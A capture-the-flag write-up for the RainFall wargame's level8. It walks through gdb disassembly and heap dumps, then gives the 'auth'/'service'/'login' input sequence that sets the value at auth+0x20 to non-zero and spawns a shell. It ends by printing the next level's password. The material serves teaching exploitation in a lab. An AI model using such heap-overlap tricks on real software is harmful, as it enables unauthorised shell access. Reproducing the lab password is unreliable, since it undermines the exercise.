# level8 

at start the program print (nil), (nil) and wait for input it looks like it dose nothing with it:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
ls
(nil), (nil) 
test
(nil), (nil) 
clear
(nil), (nil)
```

### gdb 

```bash 
(gdb) disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	push   %edi
   0x08048568 <+4>:	push   %esi
   0x08048569 <+5>:	and    $0xfffffff0,%esp
   0x0804856c <+8>:	sub    $0xa0,%esp ; Allocate 160 bytes stack
   0x08048572 <+14>:	jmp    0x8048575 <main+17> ; Start loop 
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    0x8049ab0,%ecx     ; Load `service` global
   0x0804857b <+23>:    mov    0x8049aac,%edx     ; Load `auth` global
   0x08048581 <+29>:    mov    $0x8048810,%eax    ; Format string "%p, %p \n"
   0x08048586 <+34>:    mov    %ecx,0x8(%esp)     ; Arg3: service
   0x0804858a <+38>:    mov    %edx,0x4(%esp)     ; Arg2: auth
   0x0804858e <+42>:    mov    %eax,(%esp)        ; Arg1: format string
   0x08048591 <+45>:    call   0x8048410 <printf@plt> ; Print auth/service pointers
   0x08048596 <+50>:    mov    0x8049a80,%eax     ; Load stdin
   0x0804859b <+55>:    mov    %eax,0x8(%esp)     ; Arg3: stdin
   0x0804859f <+59>:    movl   $0x80,0x4(%esp)    ; Arg2: Read 128 bytes
   0x080485a7 <+67>:    lea    0x20(%esp),%eax    ; Arg1: Buffer (stack)
   0x080485ab <+71>:    mov    %eax,(%esp)
   0x080485ae <+74>:    call   0x8048440 <fgets@plt> ; Read input
   0x080485b3 <+79>:    test   %eax,%eax          ; Check if fgets failed
   0x080485b5 <+81>:    je     0x804872c <main+456> ; Exit if EOF
   0x080485bb <+87>:    lea    0x20(%esp),%eax    ; Input buffer
   0x080485bf <+91>:    mov    %eax,%edx
   0x080485c1 <+93>:    mov    $0x8048819,%eax    ; "auth " string
   0x080485c6 <+98>:    mov    $0x5,%ecx          ; 5 bytes to compare 
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi) ; compaire
   0x080485d1 <+109>:	seta   %dl
   0x080485d4 <+112>:	setb   %al
   0x080485d7 <+115>:	mov    %edx,%ecx
   0x080485d9 <+117>:	sub    %al,%cl
   0x080485db <+119>:	mov    %ecx,%eax
   0x080485dd <+121>:	movsbl %al,%eax
   0x080485e0 <+124>:	test   %eax,%eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>
   0x080485e4 <+128>:   movl   $0x4,(%esp)        ; malloc(4)
   0x080485eb <+135>:   call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:   mov    %eax,0x8049aac     ; Store in `auth`
   0x080485f5 <+145>:   mov    0x8049aac,%eax
   0x080485fa <+150>:   movl   $0x0,(%eax)        ; *auth = 0 (init)
   0x08048600 <+156>:	lea    0x20(%esp),%eax
   0x08048604 <+160>:	add    $0x5,%eax
   0x08048607 <+163>:	movl   $0xffffffff,0x1c(%esp)
   0x0804860f <+171>:	mov    %eax,%edx
   0x08048611 <+173>:	mov    $0x0,%eax
   0x08048616 <+178>:	mov    0x1c(%esp),%ecx
   0x0804861a <+182>:	mov    %edx,%edi
   0x0804861c <+184>:	repnz scas %es:(%edi),%al
   0x0804861e <+186>:	mov    %ecx,%eax
   0x08048620 <+188>:	not    %eax
   0x08048622 <+190>:	sub    $0x1,%eax
   0x08048625 <+193>:	cmp    $0x1e,%eax
   0x08048628 <+196>:	ja     0x8048642 <main+222>
   0x0804862a <+198>:	lea    0x20(%esp),%eax
   0x0804862e <+202>:	lea    0x5(%eax),%edx
   0x08048631 <+205>:	mov    0x8049aac,%eax
   0x08048636 <+210>:	mov    %edx,0x4(%esp)
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:	lea    0x20(%esp),%eax
   0x08048646 <+226>:	mov    %eax,%edx
   0x08048648 <+228>:	mov    $0x804881f,%eax ; "reset" string 
   0x0804864d <+233>:	mov    $0x5,%ecx  ;  5 bytes to compare 
   0x08048652 <+238>:	mov    %edx,%esi
   0x08048654 <+240>:	mov    %eax,%edi
   0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)  ; compaire
   0x08048658 <+244>:	seta   %dl
   0x0804865b <+247>:	setb   %al
   0x0804865e <+250>:	mov    %edx,%ecx
   0x08048660 <+252>:	sub    %al,%cl
   0x08048662 <+254>:	mov    %ecx,%eax
   0x08048664 <+256>:	movsbl %al,%eax
   0x08048667 <+259>:	test   %eax,%eax
   0x08048669 <+261>:	jne    0x8048678 <main+276>
   0x0804866b <+263>:   mov    0x8049aac,%eax     ; Load `auth`
   0x08048670 <+268>:   mov    %eax,(%esp)
   0x08048673 <+271>:   call   0x8048420 <free@plt> ; free(auth)
   0x08048678 <+276>:	lea    0x20(%esp),%eax
   0x0804867c <+280>:	mov    %eax,%edx
   0x0804867e <+282>:	mov    $0x8048825,%eax ; service string 
   0x08048683 <+287>:	mov    $0x6,%ecx  ; 6 bytes to compare 
   0x08048688 <+292>:	mov    %edx,%esi
   0x0804868a <+294>:	mov    %eax,%edi
   0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi) ; compaire
   0x0804868e <+298>:	seta   %dl
   0x08048691 <+301>:	setb   %al
   0x08048694 <+304>:	mov    %edx,%ecx
   0x08048696 <+306>:	sub    %al,%cl
   0x08048698 <+308>:	mov    %ecx,%eax
   0x0804869a <+310>:	movsbl %al,%eax
   0x0804869d <+313>:	test   %eax,%eax
   0x0804869f <+315>:	jne    0x80486b5 <main+337>
   0x080486a1 <+317>:   lea    0x20(%esp),%eax    ; Input buffer
   0x080486a5 <+321>:   add    $0x7,%eax          ; Skip "service"
   0x080486a8 <+324>:   mov    %eax,(%esp)
   0x080486ab <+327>:   call   0x8048430 <strdup@plt> ; strdup(input+7)
   0x080486b0 <+332>:   mov    %eax,0x8049ab0     ; Store in `service`
   0x080486b5 <+337>:	lea    0x20(%esp),%eax
   0x080486b9 <+341>:	mov    %eax,%edx
   0x080486bb <+343>:	mov    $0x804882d,%eax ; "login" string 
   0x080486c0 <+348>:	mov    $0x5,%ecx    ; 5 bytes to compare
   0x080486c5 <+353>:	mov    %edx,%esi
   0x080486c7 <+355>:	mov    %eax,%edi
   0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi) ; compaire
   0x080486cb <+359>:	seta   %dl
   0x080486ce <+362>:	setb   %al
   0x080486d1 <+365>:	mov    %edx,%ecx
   0x080486d3 <+367>:	sub    %al,%cl
   0x080486d5 <+369>:	mov    %ecx,%eax
   0x080486d7 <+371>:	movsbl %al,%eax
   0x080486da <+374>:	test   %eax,%eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>
   0x080486e2 <+382>:   mov    0x8049aac,%eax     ; Load `auth`
   0x080486e7 <+387>:   mov    0x20(%eax),%eax    ; Read auth+0x20
   0x080486ea <+390>:   test   %eax,%eax          ; Check if zero
   0x080486ec <+392>:   je     0x80486ff <main+411> ; Jump if zero
   0x080486ee <+394>:   movl   $0x8048833,(%esp)  ; "/bin/sh"
   0x080486f5 <+401>:   call   0x8048480 <system@plt> ; system("/bin/sh")
   0x080486fa <+406>:	jmp    0x8048574 <main+16>
   0x080486ff <+411>:	mov    0x8049aa0,%eax
   0x08048704 <+416>:	mov    %eax,%edx
   0x08048706 <+418>:	mov    $0x804883b,%eax
   0x0804870b <+423>:	mov    %edx,0xc(%esp)
   0x0804870f <+427>:	movl   $0xa,0x8(%esp)
   0x08048717 <+435>:	movl   $0x1,0x4(%esp)
   0x0804871f <+443>:	mov    %eax,(%esp)
   0x08048722 <+446>:	call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:	jmp    0x8048574 <main+16>
   0x0804872c <+456>:	nop
   0x0804872d <+457>:	mov    $0x0,%eax
   0x08048732 <+462>:	lea    -0x8(%ebp),%esp
   0x08048735 <+465>:	pop    %esi
   0x08048736 <+466>:	pop    %edi
   0x08048737 <+467>:	pop    %ebp
   0x08048738 <+468>:	ret    
End of assembler dump.
(gdb)  info function # function used in program 
All defined functions:

Non-debugging symbols:
0x080483c4  _init
0x08048410  printf@plt
0x08048420  free@plt
0x08048430  strdup@plt
0x08048440  fgets@plt
0x08048450  fwrite@plt
0x08048460  strcpy@plt
0x08048470  malloc@plt
0x08048480  system@plt
0x08048490  __gmon_start__@plt
0x080484a0  __libc_start_main@plt
0x080484b0  _start
0x080484e0  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048564  main
0x08048740  __libc_csu_init
0x080487b0  __libc_csu_fini
0x080487b2  __i686.get_pc_thunk.bx
0x080487c0  __do_global_ctors_aux
0x080487ec  _fini
(gdb) info var # varible used in program
All defined variables:

Non-debugging symbols:
0x08048808  _fp_hw
0x0804880c  _IO_stdin_used
0x08048948  __FRAME_END__
0x0804994c  __CTOR_LIST__
0x0804994c  __init_array_end
0x0804994c  __init_array_start
0x08049950  __CTOR_END__
0x08049954  __DTOR_LIST__
0x08049958  __DTOR_END__
0x0804995c  __JCR_END__
0x0804995c  __JCR_LIST__
0x08049960  _DYNAMIC
0x08049a2c  _GLOBAL_OFFSET_TABLE_
0x08049a60  __data_start
0x08049a60  data_start
0x08049a64  __dso_handle
0x08049a80  stdin@@GLIBC_2.0
0x08049aa0  stdout@@GLIBC_2.0
0x08049aa4  completed.6159
0x08049aa8  dtor_idx.6161
0x08049aac  auth
0x08049ab0  service


```
will this is a loong one.
### steps 

- seems like the program check if the input = "auth " > load the var auth => Creates a 4-byte heap chunk
- check if the input = "reset" > free the auth
- check for service and strdup input + 7 and stor it in service 
- check for login and read auth+20 
in reset after free there is not zero set so we can use after free we just need to locat and target it to make the login option load auth+ 20 and get a non 0 so it will execut the "/bin/sh"


```bash
(gdb) break *0x080485eb # After "auth" malloc
Breakpoint 1 at 0x80485eb
(gdb) break *0x08048673 # After "reset" free
Breakpoint 2 at 0x8048673
(gdb) break *0x080486b0 # After "service" strdup
Breakpoint 3 at 0x80486b0
(gdb) break *0x080486e7 # At "login" check (auth+0x20)
Breakpoint 4 at 0x80486e7
(gdb) run
Starting program: /home/user/level8/level8 
(nil), (nil) 
auth A

Breakpoint 1, 0x080485eb in main ()
(gdb) x/s 0x8049aac
0x8049aac <auth>:	 ""
(gdb) continue
Continuing.
0x804a008, (nil) 
reset # the reset free the auth
0x804a000:	0x00000000	0x00000011	0x00000a41	0x00000000 
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000

Breakpoint 2, 0x08048673 in main ()
(gdb) x/4wx 0x8049aac 
0x8049aac <auth>:	0x0804a008	0x00000000	0x00000000	0x00000000
(gdb) x/4wx 0x0804a008
0x804a008:	0x00000a41	0x00000000	0x00000000	0x00020ff1
(gdb) continue
Continuing.
0x804a008, (nil) 
serviceBBBBBBBBBBBBBBBBBBBB
0x804a000:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a010:	0x00000000	0x00000021	0x42424242	0x42424242
0x804a020:	0x42424242	0x42424242	0x42424242	0x0000000a

Breakpoint 3, 0x080486b0 in main ()
(gdb) x/4wx 0x8049ab0
0x8049ab0 <service>:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/4wx 0x8049ab0
0x8049ab0 <service>:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/4wx 0x0804a008 + 0x20
0x804a028:	0x42424242	0x0000000a	0x00000000	0x00020fd1
(gdb) continue
Continuing.
0x804a008, 0x804a018 
login
0x804a000:	0x00000000	0x00000011	0x00000000	0x00000000
0x804a010:	0x00000000	0x00000021	0x42424242	0x42424242
0x804a020:	0x42424242	0x42424242	0x42424242	0x0000000a

Breakpoint 4, 0x080486e7 in main ()

(gdb) x/21wx 0x8049aac # auth content
0x8049aac <auth>:	0x0804a008	0x0804a018	0x00000000	0x00000000
0x8049abc:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049acc:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049adc:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049aec:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049afc:	0x00000000
(gdb) x/21wx 0x0804a008
0x804a008:	0x00000000	0x00000000	0x00000000	0x00000021
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x0000000a	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000
(gdb) x/21wx 0x8049ab0
0x8049ab0 <service>:	0x0804a018	0x00000000	0x00000000	0x00000000
0x8049ac0:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049ad0:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049ae0:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049af0:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b00:	0x00000000
(gdb) x/21wx 0x0804a018
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x0000000a	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000
```
lets get to exeute the "/bin/bash"
reset wont set to 0 and allso the login try to read auth + 20 we just need to allocat auth and then service + 7 now the read of auth + 20 will reach the last byte writed with service and here you go the it != 0.

```bash
(gdb) break *0x080486e7
Breakpoint 1 at 0x80486e7
(gdb) run 
Starting program: /home/user/level8/level8 
(nil), (nil) 
auth AAAAAAA
0x804a008, (nil) 
serviceBBBBBBBBBBBBBBBBBBBBB
0x804a008, 0x804a018 
login

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/21wx 0x0804a008
0x804a008:	0x41414141	0x0a414141	0x00000000	0x00000021
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x00000a42	0x00000000	0x00020fd1
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000
(gdb) continue
Continuing.
$ 
$ cd ..
$ cd level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 

```
